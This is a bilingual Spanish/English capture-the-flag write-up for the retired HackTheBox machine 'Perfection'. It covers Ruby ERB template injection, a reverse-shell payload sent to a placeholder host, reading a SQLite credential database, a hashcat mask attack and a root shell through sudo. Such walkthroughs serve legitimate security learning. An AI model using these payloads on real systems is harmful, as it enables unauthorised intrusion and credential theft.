# Perfection [Easy]

> **ES:** Máquina Linux Easy con calculadora de notas en Ruby (WEBrick); SSTI en ERB para RCE y root directo por sudo total tras crackear hash con formato deducido de un correo.
> **EN:** Easy Linux box with a Ruby grade calculator (WEBrick); SSTI in ERB for RCE and direct root via full sudo after cracking a hash with a format learned from a mail.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Perfection] |
| **URL** | https://app.hackthebox.com/machines/Perfection |
| **IP lab** | 10.10.11.253 |
| **Fecha de resolución** | 2026-09-24 |

---

## Fuentes / Sources

- [IppSec: Perfection (video)](https://youtube.com/watch?v=zcVCLoMsOKA) - IppSec - fecha de acceso: 2026-09-24.

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía SSTI Ruby en `/weighted-grade-calc` y `sudo -i` con credencial crackeada.
> **EN:** Get `user.txt` and `root.txt` via Ruby SSTI on `/weighted-grade-calc` and `sudo -i` with a cracked credential.

---

## Fuentes / Sources


## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] Burp Suite (POST a `/weighted-grade-calc`)
- [ ] pwncat-cs (listener)
- [ ] sqlite3 (lectura de `pupilpath_credentials.db`)
- [ ] hashcat `-m 1400` (SHA256) con máscara deducida

---

## Fuentes / Sources


## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** Puertos 22 y 80 (nginx + app "Weighted Grade Calculator", backend WEBrick/Ruby).
> **EN:** Ports 22 and 80 (nginx + "Weighted Grade Calculator" app, WEBrick/Ruby backend).

```bash
nmap -sC -sV -p- -oN nmap_init 10.10.11.253
curl -s http://10.10.11.253/ | head -40
```

**Resultado / Result:** Formulario con campos `category/grade/weight` (x5). Captura en `img/` original.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Interceptar el POST; el valor de `category` se refleja en el resultado → probar SSTI ERB (`<%= ... %>`).
> **EN:** Intercept the POST; the `category` value is reflected in the result → test ERB SSTI (`<%= ... %>`).

```bash
# Prueba no destructiva (concepto): enviar 7*7 envuelto en ERB y ver si evalúa
# category1=<%= 7*7 %>
```

**Resultado / Result:** El motor evalúa Ruby → RCE posible con `system()`/`IO.popen`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Inyectar reverse shell Ruby vía ERB URL-encoded en `category1` con listener en espera.
> **EN:** Inject a Ruby reverse shell via URL-encoded ERB in `category1` with a listener ready.

```bash
pwncat-cs -lp 9999
# Payload conceptual (parafraseado, URL-encoded):
# <%= system("bash -c '/bin/bash -i >& /dev/tcp/TU-IP/9999 0>&1'") %>
```

**Resultado / Result:** Shell como `susan` en `/home/susan/ruby_app`.

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Leer `user.txt` del home (flag no publicada). Pistas laterales: `Migration/pupilpath_credentials.db` (hashes) y correo en `/var/spool/mail/susan` con el formato de password.
> **EN:** Read `user.txt` from the home (flag not published). Side clues: `Migration/pupilpath_credentials.db` (hashes) and mail in `/var/spool/mail/susan` with the password format.

```bash
whoami; ls -la /home/susan/
cat /home/susan/user.txt  # solo en lab retirado
cat /var/spool/mail/susan
sqlite3 ./Migration/pupilpath_credentials.db 'select * from user;'
```

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** El correo revela el formato `{nombre}_{nombre-invertido}_{1-1e9}` → ataque de máscara hashcat contra el hash SHA256 de Susan → `sudo -l` muestra `(ALL:ALL) ALL` → `sudo -i`.
> **EN:** The mail reveals the format `{name}_{reversed-name}_{1-1e9}` → hashcat mask attack on Susan's SHA256 → `sudo -l` shows `(ALL:ALL) ALL` → `sudo -i`.

```bash
hashcat -m 1400 -a 3 '<hash-susan>' 'susan_nasus_?d?d?d?d?d?d?d?d?d'
sudo -l
sudo -i
whoami  # root
cat /root/root.txt  # solo en lab retirado
```

**Resultado / Result:** Root directo por sudo total con password crackeada por patrón conocido.

---

## Fuentes / Sources


## 🧠 Lo aprendido / Learned

> **ES:** SSTI en ERB/Ruby; shells vía `system()`; reutilizar correos internos para inferir políticas de password; máscaras hashcat con sufijo numérico.
> **EN:** SSTI in ERB/Ruby; shells via `system()`; reusing internal mails to infer password policies; hashcat masks with numeric suffix.

- [ ] Detección de SSTI por reflexión de parámetros
- [ ] Exfil de DB SQLite local (`pupilpath_credentials.db`)
- [ ] `sudo (ALL:ALL) ALL` → escalado trivial con credencial válida

---

## Fuentes / Sources


## 📚 Fuentes y Referencias / Sources

- **Fuente:** Notas locales `index.md` + capturas en `img/` (contenido propio previo, sin normalizar)
- **Walkthrough de referencia:** [verificar en app.hackthebox.com/machines/Perfection]
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Nota original en chino/inglés migrada al molde bilingüe ES/EN; flags y password ofuscados, payloads parafraseados.

---

## Fuentes / Sources


## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
